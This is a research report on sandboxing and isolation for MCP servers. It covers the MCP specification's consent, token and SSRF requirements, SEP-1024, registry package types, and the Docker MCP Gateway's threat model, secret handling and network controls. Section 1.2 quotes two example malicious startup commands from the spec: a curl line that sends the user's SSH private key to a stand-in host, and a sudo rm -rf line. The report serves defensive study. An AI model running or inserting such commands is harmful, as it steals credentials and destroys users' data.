# Sandboxing and Isolation for MCP Servers — State of the Art as of 2026-09-19

**Research date:** 2026-09-19
**Method:** primary sources only (official specs/docs, GitHub releases + release-note feeds, vendor engineering blogs, kernel docs, man pages, CVE/GHSA records). Every claim carries an inline URL and a version/date. Items I could not verify are explicitly marked **UNVERIFIED**. Conflicts between sources are flagged **CONFLICT**.

**Reading note on dates:** where a source is a living document (spec page, README, docs site) the date given is the *fetch date* (2026-09-19) plus, where the source itself states one, its own version/effective date. GitHub release dates come from the `releases.atom` feeds, which carry the tag publication timestamp.

---

## 0. Executive summary — the five things that actually matter

1. **The MCP specification itself is now explicitly sandbox-positive but not sandbox-normative.** The 2026-07-28 revision of the Security Best Practices page says MCP clients **SHOULD** "Execute MCP server commands in a sandboxed environment with minimal default privileges" and **SHOULD** "Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)" — SHOULD, not MUST ([modelcontextprotocol.io, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)). The only MUST in that area is a *consent* MUST, inherited from SEP-1024.
2. **Tool poisoning is still absent from the normative security pages.** I full-text fetched both the Security Best Practices page and the Authorization Security Considerations page for 2026-07-28; neither contains a "tool poisoning" section. The nearest normative hook is one sentence in the Tools spec: clients **MUST** consider tool annotations untrusted unless they come from trusted servers ([tools.md, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md)).
3. **Docker MCP Gateway is the only shipping, productized, documented gateway with a published threat model** — and it deliberately does **not** run servers under gVisor or a microVM. It runs plain Docker containers with `no-new-privileges` + cgroup limits, and it explicitly states "Network egress is not globally denied by default" ([docs/security.md, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md)).
4. **On the client side, Anthropic's Claude Code is the most concrete artifact**: OS-level enforcement via Seatbelt (macOS) and bubblewrap + seccomp (Linux/WSL2), with the same engine open-sourced as `@anthropic-ai/sandbox-runtime` v0.0.77 (2026-09-18) ([code.claude.com/docs/en/sandboxing, fetched 2026-09-19](https://code.claude.com/docs/en/sandboxing); [releases.atom, 2026-09-18](https://github.com/anthropics/sandbox-runtime/releases/tag/v0.0.77)).
5. **WASM/WASI is technically ready and officially unsupported.** WASI 0.3.0 landed 2026-06-11; Wasmtime 48.0.x ships denial-by-default TCP/UDP sockets. But the official MCP Registry supports exactly six package types — npm, PyPI, NuGet, Cargo, OCI, MCPB — and **no WASM/WASI type**, and there is **no WASM-related SEP** ([registry package-types, fetched 2026-09-19](https://modelcontextprotocol.io/registry/package-types.md); [SEP index via llms.txt, fetched 2026-09-19](https://modelcontextprotocol.io/llms.txt)).

---

## 1. Official MCP guidance on sandboxing and security

### 1.1 Which documents are current

- Current protocol revision referenced by the docs site: **2026-07-28**. Prior revisions still published: 2025-11-25, 2025-06-18, 2025-03-26, 2024-11-05, plus `draft` ([llms.txt index, fetched 2026-09-19](https://modelcontextprotocol.io/llms.txt)).
- The 2026-07-28 revision is a **breaking, statelessness-oriented revision**. Key changes: protocol-level sessions and the `Mcp-Session-Id` header removed; `initialize`/`notifications/initialized` handshake removed; `ping`, `logging/setLevel`, `notifications/roots/list_changed` removed; Roots/Sampling/Logging deprecated (SEP-2577); SSE resumability and `Last-Event-ID` removed ([changelog, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).
- **Security-relevant consequence:** "session hijacking" is a *retired* attack class in the current revision. The 2026-07-28 Security Best Practices page replaces it with **"State Handle Hijacking"** and explicitly points backwards: "For guidance on securing the server-assigned session IDs used by protocol version `2025-11-25` and earlier, see Session Hijacking in the 2025-11-25 version of this page" ([security_best_practices, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)). Treat "session hijacking" guidance as **legacy/2025-11-25-and-earlier only**.

### 1.2 Running local servers — exact normative language

Source: [MCP Security Best Practices, § Local MCP Server Compromise, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)

Attack description quoted from the spec: "Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible: (1) An attacker includes a malicious 'startup' command in a client configuration (2) An attacker distributes a malicious payload inside the server itself (3) An attacker accesses an insecure local server that's left running on localhost via DNS rebinding."

The spec even ships example malicious startup commands, including:

```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Privilege escalation
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

**Consent (MUST):**

> "If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands."

Pre-configuration consent — the client **MUST**:
- "Show the exact command that will be executed, without truncation (include arguments and parameters)"
- "Clearly identify it as a potentially dangerous operation that executes code on the user's system"
- "Require explicit user approval before proceeding"
- "Allow users to cancel the configuration"

**Sandboxing (SHOULD — verbatim list):** the client **SHOULD**:
- "Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)"
- "Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)"
- "Warn that MCP servers run with the same privileges as the client"
- "Execute MCP server commands in a sandboxed environment with minimal default privileges"
- "Launch MCP servers with restricted access to the file system, network, and other system resources"
- "Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed"
- "Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)"
- "Keep sandboxing solutions up-to-date to account for emerging vulnerabilities"

**Server-side guidance for local servers (SHOULD):**
- "Use the `stdio` transport to limit access to just the MCP client"
- If using an HTTP transport: "Require an authorization token" or "Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access"

### 1.3 Confused deputy

Source: [Security Best Practices § Confused Deputy Problem, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md) and [Authorization Security Considerations, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)

- **MUST:** "To prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below."
- **MUST:** "MCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically registered client before forwarding to third-party authorization servers."
- Vulnerable condition set (all four required): static client ID at the 3P AS; MCP proxy allows dynamic client registration; 3P AS sets a consent cookie; proxy lacks per-client consent.
- **Consent storage MUST:** maintain a registry of approved `client_id` values **per user**; check it **before** initiating the third-party flow; store decisions server-side or in server-specific cookies.
- **Consent UI MUST:** identify the requesting MCP client by name; display the specific third-party API scopes; show the registered `redirect_uri`; implement CSRF protection; "Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY`".
- **Consent cookie MUST:** use the `__Host-` prefix; set `Secure`, `HttpOnly`, `SameSite=Lax`; be cryptographically signed or server-side; be bound to the specific `client_id`.
- **Redirect URI MUST:** exact string match to the registered URI; reject on change without re-registration; "Use exact string matching (not pattern matching or wildcards)".
- **OAuth `state` MUST:** CSPRNG-generated per request; stored server-side **only after** consent approval; cookie/session set **immediately before** the 3P redirect (not before consent); validated at callback; single-use; "short expiration time (e.g., 10 minutes)". Explicit: "The consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen."

### 1.4 Token passthrough

Source: [Security Best Practices § Token Passthrough, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md); [Authorization Security Considerations, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)

Definition quoted: "'Token passthrough' is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API."

- **MUST NOT:** "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server."
- **MUST:** MCP servers "**MUST** validate that tokens presented to them were specifically issued for their use".
- **MUST NOT:** "The MCP server **MUST NOT** pass through the token it received from the MCP client" — the upstream credential is a separate token issued by the upstream AS.
- **MUST:** "MCP clients **MUST** implement and use the `resource` parameter as defined in [RFC 8707]" (Resource Indicators), aligning with RFC 9728 §7.4.
- **MUST:** servers "**MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token".
- Rationale given: circumvention of rate limiting/request validation/monitoring; audit-trail breakage; trust-boundary breakage; future-compatibility risk.

### 1.5 State handle hijacking (replaces "session hijacking" in 2026-07-28)

Source: [Security Best Practices § State Handle Hijacking, 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)

- **MUST:** "MCP servers that implement authorization **MUST** verify all inbound requests."
- **MUST NOT:** "MCP servers **MUST NOT** treat possession of a state handle as authentication."
- **SHOULD:** "use secure, non-deterministic handles generated with secure random number generators"; "Expiring handles can also reduce the risk."
- **SHOULD:** "bind handles server-side to the authenticated user, for example by keying stored state as `<user_id>:<handle>` where the user ID is derived from the verified token rather than supplied by the client, and reject a handle presented by any other principal."
- Supporting non-normative guidance in the Tools spec: handles should be opaque; for unauthenticated servers "the handle is necessarily a bearer token, [so] it should be generated with sufficient entropy (e.g., a UUIDv4) and given a bounded lifetime" ([tools.md § Stateful Tools, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md)).

### 1.6 Other normative security content (2026-07-28)

**Authorization Security Considerations** ([URL](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)):
- "implementors **MUST** follow OAuth 2.1 security best practices" (OAuth 2.1 §7).
- **MUST:** PKCE, and "**MUST** verify PKCE support before proceeding with authorization"; "**MUST** use the `S256` code challenge method when technically capable".
- **MUST:** refuse to proceed if `code_challenge_methods_supported` is absent from AS metadata (both OAuth 2.0 AS Metadata and OIDC Discovery). Authorization servers providing OIDC Discovery "**MUST** include `code_challenge_methods_supported`".
- **MUST:** all authorization server endpoints over HTTPS; redirect URIs either `localhost` or HTTPS.
- **MUST:** clients have redirect URIs registered; AS "**MUST** validate exact redirect URIs against pre-registered values".
- **MUST:** clients implement secure token storage, per OAuth 2.1 §7.1. AS **SHOULD** issue short-lived access tokens. For public clients, AS "**MUST** rotate refresh tokens".
- **MUST:** AS "clearly display the redirect URI hostname during authorization"; **SHOULD** display additional warnings for `localhost`-only redirect URIs; **MAY** require additional attestation.
- **MAY:** AS implement domain-based trust policies for Client ID Metadata Documents.

**SSRF** ([security_best_practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md)):
- **MUST:** "MCP clients deployed to a server **MUST** consider SSRF risks and implement appropriate mitigations when fetching OAuth-related URLs."
- **SHOULD:** require HTTPS for all OAuth-related URLs in production; reject `http://` except loopback in development.
- **SHOULD:** block private/reserved ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `::1`, `169.254.0.0/16`, `fc00::/7`, `fe80::/10`. Spec warns: "Avoid implementing IP validation manually. Attackers exploit encoding tricks (octal, hex, IPv4-mapped IPv6) that custom parsers often miss."
- **SHOULD:** apply the same validation to redirect targets; consider disabling automatic redirect following.
- **SHOULD:** "use an egress proxy that enforces network policies… Use tools like [Smokescreen] or similar egress proxies that prevent SSRF by design."
- Explicit TOCTOU/DNS-rebinding warning; "Consider pinning DNS resolution results between check and use."

**OAuth authorization URL validation** — the spec is unusually prescriptive here:
- **MUST:** "only allow `http://` and `https://` schemes for authorization URLs" (`http://` only for loopback in development).
- **MUST:** "reject `javascript:`, `data:`, `file:`, `vbscript:`, and other potentially dangerous schemes."
- **MUST NOT:** "use shell commands (e.g., `cmd.exe`, `sh`, PowerShell) to open URLs."
- **SHOULD:** CSP `script-src 'self'`, `default-src 'self'`, or `script-src 'nonce-<random>'`.
- **MUST:** sanitize and validate all URLs received from MCP servers.

**stdio transport in proxy scenarios:**
- Explicitly scoped: "This attack vector only applies to MCP implementations that use a proxy architecture, not to direct `stdio` transport usage."
- MCP proxy services **SHOULD**: "Implement sandboxing or containerization for spawned processes"; "Restrict file system access for spawned MCP servers"; "Log all `stdio` transport usage for security monitoring"; "Require additional authorization for potentially dangerous commands".

**Scope minimisation:** servers SHOULD emit precise scope challenges rather than the full catalogue; common mistakes listed include "Publishing all possible scopes in `scopes_supported`" and "Using wildcard or omnibus scopes (`*`, `all`, `full-access`)".

### 1.7 SEP-1024 — exact status and content

Source: [SEP-1024, fetched 2026-09-19](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md)

| Field | Value |
|---|---|
| SEP | 1024 |
| Title | MCP Client Security Requirements for Local Server Installation |
| Status | **Final** (Standards Track) |
| Created | **2025-07-22** |
| Author | Den Delimarsky |
| Sponsor | None |
| PR | [modelcontextprotocol/modelcontextprotocol#1024](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/1024) |

The page carries this note verbatim: "This SEP has reached Final status and is preserved as a historical record of the design as accepted. Changes made to the protocol after finalization are not reflected here. Refer to the current specification and its changelog for authoritative requirements."

**What SEP-1024 actually mandates (this is narrower than people assume):** exactly one MUST block — pre-configuration consent:

> "Before executing any command to install or configure a local MCP server, the MCP client **MUST**: (1) Display a clear consent dialog that shows: the exact command that will be executed, without truncation; all arguments and parameters; a clear warning that this operation may be potentially dangerous. (2) Require explicit user approval through an affirmative action (button click, checkbox, etc.). (3) Provide an option for users to cancel the installation. (4) Not proceed with installation if consent is denied or not provided."

**What SEP-1024 does NOT mandate:** sandboxing. Sandboxing appears only under "Risk Mitigation" as a non-normative residual-risk remedy: "Recommendation for additional security layers (sandboxing, signatures)". It also lists residual risks it does not solve: "User Override", "Sophisticated Obfuscation", "Implementation Gaps". Reference Implementation: **N/A**.

**Provenance note:** SEP-1024's motivation cites VS Code and Cursor consent dialogs, with a link to a third-party blog post (`den.dev/blog/vs-code-mcp-install-consent/`).

### 1.8 Tool poisoning in the official spec — what exists and what does not

**Verified negative:** neither the 2026-07-28 [Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md) page nor the 2026-07-28 [Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md) page contains a section on tool poisoning, tool description poisoning, prompt injection via tool descriptions, or line-jumping. I fetched both in full; the attack sections are: Confused Deputy, Token Passthrough, SSRF, State Handle Hijacking, Local MCP Server Compromise, OAuth Authorization URL Validation, stdio Transport Security in Proxy Scenarios, Mix-Up Attacks, Localhost Redirect URI Impersonation, CIMD Trust Policies, Scope Minimization.

**What the spec does say, normatively, about tool metadata** ([tools.md, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md)):

> "For trust & safety and security, clients **MUST** consider tool annotations to be untrusted unless they come from trusted servers."

> "For trust & safety and security, there **SHOULD** always be a human in the loop with the ability to deny tool invocations. Applications **SHOULD**: Provide UI that makes clear which tools are being exposed to the AI model; Insert clear visual indicators when tools are invoked; Present confirmation prompts to the user for operations, to ensure a human is in the loop."

Tool security considerations in the same page:
- Servers **MUST**: "Validate all tool inputs"; "Implement proper access controls"; "Rate limit tool invocations"; "Sanitize tool outputs".
- Clients **SHOULD**: "Prompt for user confirmation on sensitive operations"; "Show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration"; "Validate tool results before passing to LLM"; "Implement timeouts for tool calls"; "Log tool usage for audit purposes".

Also relevant: `tools/list` results **MUST NOT** vary per-connection or as a side effect of other requests, but **MAY** vary by the authorization presented — "returning only the tools the caller's granted scopes permit".

**Where the work is happening instead:** the MCP **Security Interest Group** charter (initial charter **2026-06-13**, facilitators Den Delimarsky and Paul Carleton, both Anthropic) lists in-scope items directly relevant to sandboxing: "Transport-adjacent security: secrets handling, **process isolation**, and unauthenticated surface area for stdio and other non-HTTP transports where the HTTP authorization specification does not apply"; "Supply chain and provenance: integrity of locally executed server binaries and packages (typosquatting, unpinned dependencies, unsigned artifacts) and how clients can verify what they spawn"; "Runtime drift and post-admission change". Open agenda items include SEP-2809 "Attested Tool-Server Admission (ATSA)" (Draft) and "Capability declarations: hints or contracts" (Open, joint with the Tool Annotations IG) ([Security IG charter, 2026-06-13](https://modelcontextprotocol.io/community/interest-groups/security.md)).

### 1.9 MCP registry: what can even be packaged

Source: [MCP Registry Supported Package Types, fetched 2026-09-19](https://modelcontextprotocol.io/registry/package-types.md) (schema referenced: `https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json`; the registry page itself notes "The MCP Registry is currently in preview. Breaking changes or data resets may occur before general availability.")

Supported `registryType` values: **`npm`, `pypi`, `nuget`, `cargo`, `oci`, `mcpb`**. Ownership verification per type:
- npm: `mcpName` in `package.json` **MUST** match the `server.json` name.
- PyPI / NuGet: `mcp-name: $SERVER_NAME` string in the README; `$SERVER_NAME` **MUST** match.
- Cargo: same token, but **crates.io strips HTML comments**, so the hidden-comment form does not work — the token must be visible markdown.
- OCI: `io.modelcontextprotocol.server.name` image label **MUST** match; supported registries are Docker Hub, ghcr.io, `*.pkg.dev`, `*.azurecr.io`, `mcr.microsoft.com`.
- MCPB: URL **MUST** contain the string "mcp"; metadata **MUST** include `fileSha256`. Note: "The MCP Registry does not validate this hash; however, MCP clients **do** validate the hash before installation."

**Verified negative: there is no WASM/WASI/`wasm` registryType, and the word "WebAssembly" does not appear on that page.** There is also **no WASM-related SEP** in the SEP index (checked against the complete SEP list in [llms.txt, fetched 2026-09-19](https://modelcontextprotocol.io/llms.txt)).

---

## 2. Docker MCP Gateway / MCP Catalog / MCP Toolkit

### 2.1 Versions and dates

| Artifact | Version | Date | Source |
|---|---|---|---|
| `github.com/docker/mcp-gateway` (latest tagged release) | **v0.43.3** | **2026-07-16** | [releases.atom](https://github.com/docker/mcp-gateway/releases.atom); [pkg.go.dev versions list](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions) |
| v0.43.1 — **major security hardening release** | v0.43.1 | 2026-06-25 | [release notes](https://github.com/docker/mcp-gateway/releases/tag/v0.43.1) |
| v0.43.0 | v0.43.0 | ~2026-06-22 | [pkg.go.dev](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions) |
| v0.42.3 | v0.42.3 | 2026-06-12 | [release atom](https://github.com/docker/mcp-gateway/releases.atom) |
| v0.42.2 — **fix for CVE-2026-55887** | v0.42.2 | 2026-05-28 | same |
| v0.42.1 | v0.42.1 | 2026-05-05 | [pkg.go.dev](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions) |
| v0.42.0 — profiles always enabled | v0.42.0 | 2026-04-30 | [release notes](https://github.com/docker/mcp-gateway/releases/tag/v0.42.0) |
| v0.40.4 | v0.40.4 | 2026-04-09 | [pkg.go.dev](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions) |

Cadence: roughly weekly-to-monthly. Full history back to v0.9.0 (2025-06-29) is on the [versions page](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions).

Prerequisites / composition: **Docker Desktop 4.59+** with the MCP Toolkit feature for the plugin path ([README, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/README.md)); **Docker Desktop 4.62+** for the `docker mcp profile` command set described in the docs ([docker/docs `cli.md`, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/cli.md)).

### 2.2 There is a *published threat model* — this is unusual and important

Source: [`docker/mcp-gateway/docs/security.md`, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md). Verbatim framing:

> "Docker MCP Gateway is a security boundary between MCP clients and the MCP servers that the gateway runs or connects to."

**Trust assumptions (verbatim):** "The local OS user, Docker daemon, Docker Desktop components, configured credential store, configured interceptors, and local Docker MCP configuration files are trusted." … "A catalog, profile, server entry, OCI image label, MCP registry entry, README URL, or remote MCP server URL may be untrusted." … "The code inside an enabled MCP server may be malicious. It should only receive the environment variables, secrets, filesystem mounts, network access, and MCP routing access granted by the gateway configuration and defaults."

**Out-of-scope examples that matter for expectations (verbatim excerpts):** "Prompt injection, tool-description poisoning, or malicious content from a tool, README, remote service, or upstream API, unless it bypasses a gateway boundary described in this document." Also out of scope: "A malicious enabled MCP server abuses access that was intentionally granted to it, such as reading a mounted directory, using an assigned secret, contacting an allowed host, or returning malicious content to the MCP client."

**Translation:** the gateway is a *containment and least-privilege* boundary, not a prompt-injection defence. It explicitly disclaims the tool-poisoning threat class.

### 2.3 Tool-level permissions / allow-lists

Three independent mechanisms:

1. **Per-gateway tool selection at launch:**
   ```bash
   docker mcp gateway run --servers server1,server2 --tools server1:* --tools server2:tool2
   ```
   ([docs/mcp-gateway.md, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/mcp-gateway.md))
2. **Per-profile tool allow/deny** (`docker mcp profile tools <profile-id>`), dot notation `<server>.<tool>`:
   ```bash
   docker mcp profile tools dev --enable github.create_issue --disable github.search_code
   docker mcp profile tools production --disable-all github --disable-all slack
   ```
   Documented default: "By default, all tools are enabled unless explicitly disabled" ([docs/profiles.md, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/profiles.md)). Note that this default is **allow-by-default within an enabled server** — the allowlist is the server set, not the tool set.
3. **Server enablement:** `docker mcp server enable/disable/reset` and `--enable-all-servers`; `--profile` is mutually exclusive with `--servers` and with `--enable-all-servers` ([docs/profiles.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/profiles.md)).

Additional policy enforcement documented in the threat model: "Gateway policy decisions must apply consistently across direct tool calls, dynamic tool execution, `mcp-exec`, and code-mode generated tools." Collisions across servers are rejected: "The gateway rejects exposed tool names that collide with reserved gateway tools or with tools from another enabled server. It also rejects collisions for prompt names, resource URIs, and resource template URI templates."

### 2.4 Secret injection — **does the container see the secret? Yes, as an env var**

This is the question with the most confusion in the wild, so here is the chain of primary evidence.

**(a) How secrets are declared.** Server entries declare secrets with an explicit environment-variable target:

> `secrets` | []Secret | No | API keys and secrets required by the server.
> Secret Object: `name` (string, **Yes**, "Must be prefixed by unique name of the server (e.g., `brave.api_key`)"), **`env` (string, Yes, "Environment variable name to inject the secret as (e.g., `BRAVE_API_KEY`)")**, `example` (string, Yes).
> — [`docs/server-entry-spec.md`, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/server-entry-spec.md)

Concrete example from the same spec:

```yaml
name: github-official
type: server
image: ghcr.io/github/github-mcp-server@sha256:a1d43076a36638ee24520fd6e83c3905ae41bc9850179081df1de2ba3a7afae0
secrets:
  - name: github.personal_access_token
    env: GITHUB_PERSONAL_ACCESS_TOKEN
    example: <YOUR_TOKEN>
allowHosts:
  - api.github.com:443
```

Legacy catalog schema is identical in shape ([docs/catalog.md, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/catalog.md)):
```yaml
secrets:
  - name: "my-custom-server.api_key"
    env: "DB_API_KEY"
    example: "your-api-key-here"
```

**(b) How the gateway describes it.** From the threat model, verbatim: "MCP server containers do not receive the user's host environment by default. The gateway passes only configured environment variables, server config values, and secrets declared for that server." ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md))

**(c) Where the value is stored.** Docker's own FAQ: "Starting with Docker Desktop version **4.43.0**, credentials are stored securely in the Docker Desktop VM. The storage implementation depends on the platform (for example, macOS, WSL2)." Managed via `docker mcp secret ls`, `docker mcp secret rm`, `docker mcp oauth revoke`. Docker also notes: "Are credentials removed when an MCP server is uninstalled? **No.**" ([docs.docker.com MCP Toolkit FAQs, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/faqs.md))

**(d) How the value crosses into the container.** Docker Desktop's secrets engine resolves an `se://` URI at container runtime. Release note v0.40.3 (2026-03-20): "When `GetSecrets()` fails (e.g. MSIX-sandboxed Claude Desktop on Windows cannot follow AF_UNIX reparse points to the WSL2 secrets engine socket), generate `se://` URIs for all declared secrets instead of silently setting them to `<UNKNOWN>`. **Docker Desktop resolves `se://` URIs at container runtime via named pipes**" ([release notes v0.40.3](https://github.com/docker/mcp-gateway/releases/tag/v0.40.3)). v0.43.3 (2026-07-16) notes "refactor: use docker/secrets-engine SDK" ([release notes](https://github.com/docker/mcp-gateway/releases/tag/v0.43.3)).

**(e) Secret source configuration.** `--secrets` flag, default `docker-desktop`: "Colon separated paths to search for secrets. Can be `docker-desktop` or a path to a .env file". Example from the docs: `docker mcp gateway run --secrets=docker-desktop:./.env` ([generated CLI reference, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/generator/reference/mcp_gateway_run.md); [docs/mcp-gateway.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/mcp-gateway.md)). `.env` fallback means secrets can be **plaintext on disk** if the operator configures it.

**Answer, precisely:** for **containerized** (`type: server`) MCP servers the plaintext secret is injected **into the server container as an environment variable**. It is never an env var of the gateway process (the gateway hands Docker Desktop an `se://` handle), but the server process itself — and any child process, and anything that can read `/proc/<pid>/environ` inside that container — does see the value. There is **no documented header-rewriting / token-swapping proxy for classic gateway containers**; the closest documented thing is `--block-secrets`, which is a *scanner*, not an injector.

**(f) Compensating controls that do exist:**
- Secret-name validation and per-server scoping: "Secrets are scoped to the server that declares them. Secret names are validated before they are used with the credential resolver, and one server should not be able to receive another server's declared secrets by guessing names or using pattern metacharacters." ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md))
- **`--block-secrets` defaults to `true`**: "Block secrets from being/received sent to/from tools" ([CLI reference](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/generator/reference/mcp_gateway_run.md)). Threat-model detail: it "scans tool-call arguments and text responses for secret-like values before and after tool execution."
- **`--log-calls` defaults to `true`** but now logs metadata only: "call logs record the tool name and argument shape metadata only. Raw tool-call argument keys and values must not be logged by the default call logger." This was a **breaking change in v0.43.1**: "Tool call logs no longer include raw argument values."
- Known limitation (v0.43.1 notes): "**Current Limitation**: Secrets are scoped across all servers rather than for each profile." (from [docs/profiles.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/profiles.md)) — this partially contradicts the per-server scoping claim in `security.md`; **CONFLICT**, flagging as unresolved. The profiles doc is describing profile-level scoping; `security.md` describes server-level scoping. Both can be true simultaneously (server-scoped, not profile-scoped).
- Secrets are excluded from shared profiles: "Credentials are not included for security reasons" ([docker/docs cli.md](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/cli.md), [FAQs](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/faqs.md)).

**Contrast — Docker Sandboxes does the opposite.** In Docker Sandboxes, "the host-side proxy injects authentication headers into outbound HTTP requests. **The raw credential values never enter the VM.**" ([Sandboxes security model, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/security/_index.md)). That is a genuinely different architecture — but it protects the *sandbox VM*, not MCP server containers, and it only covers HTTP egress, not stdio MCP servers.

### 2.5 Network egress control and isolation

Verbatim from the threat model: **"Network egress is not globally denied by default."**

Three levers:

| Lever | Scope | Default | Source |
|---|---|---|---|
| `disableNetwork: true` in server entry | per server | `false` | [server-entry-spec.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/server-entry-spec.md) |
| `allowHosts: ["api.github.com:443", ...]` in server entry | per server (host:port allowlist) | unset | same |
| `--block-network` | gateway-wide — "Block tools from accessing forbidden network resources" | `false` | [CLI reference](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/generator/reference/mcp_gateway_run.md) |

The spec's own best-practice line: "Use `allowHosts` to restrict network access; Use `disableNetwork: true` for tools that don't need network" ([server-entry-spec.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/server-entry-spec.md)).

For **remote** MCP servers (type: `remote`) the gateway does enforce a stricter outbound policy by default: "Remote MCP URLs and untrusted HTTP fetches require public HTTPS destinations by default. The gateway rejects userinfo, unsafe hostnames, loopback, private, link-local, metadata-service, and other non-public IP ranges, and it validates redirect destinations." Escape hatch: `DOCKER_MCP_ALLOW_INSECURE_REMOTE_URLS=1` ("development and test opt-out"). Also: "Generic proxy settings from the environment are not used for guarded remote URL paths because they can hide the final destination from client-side validation" ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md); [v0.43.1 notes](https://github.com/docker/mcp-gateway/releases/tag/v0.43.1)).

### 2.6 Container isolation model — **which runtime?**

**Verified from the complete generated CLI flag reference for `docker mcp gateway run`** ([mcp_gateway_run.md, fetched 2026-09-19](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/generator/reference/mcp_gateway_run.md)) — the full option list is:

`--additional-catalog`, `--additional-config`, `--additional-registry`, `--additional-tools-config`, `--allow-unauthenticated`, `--block-network`, `--block-secrets` (default `true`), `--catalog`, `--config`, `--cpus` (default `1`), `--debug-dns`, `--dry-run`, `--enable-all-servers`, `--host`, `--interceptor`, `--log-calls` (default `true`), `--long-lived`, `--mcp-registry`, `--memory` (default `2Gb`), `--oci-ref`, `--port` (default `0`), `--preserve-tool-schema-dialect`, `--registry`, `--secrets` (default `docker-desktop`), `--servers`, `--static`, `--tools`, `--tools-config`, `--transport` (default `stdio`), `--verbose`, `--verify-signatures` (default `true`), `--watch` (default `true`).

